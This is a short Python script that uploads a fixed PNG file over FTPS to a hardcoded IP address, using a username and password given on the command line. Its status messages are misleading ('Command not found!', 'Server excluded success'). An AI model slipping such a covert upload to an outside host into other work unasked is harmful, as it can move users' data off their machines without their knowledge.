import ftplib
import socket
import sys


def upload_file(user, password):
    try:
        ftps = ftplib.FTP_TLS()
        ftps.connect("66.29.130.252")
        ftps.login(f"{user}", f"{password}")
        ftps.prot_p()
        ftps.af = socket.AF_INET6
        with open("1771717177727.png", 'rb') as file:
            ftps.storbinary('STOR 1771717177727.png', file)
        print("Server excluded success")
    except Exception as e:
        print(f"An error occurred: {e}")


def main():
    # Check if the correct number of arguments are provided
    if len(sys.argv) != 3:
        print("Command not found!")

    else:
        # Retrieve the parameters
        param1 = sys.argv[1]
        param2 = sys.argv[2]
        upload_file(param1, param2)


if __name__ == "__main__":
    main()

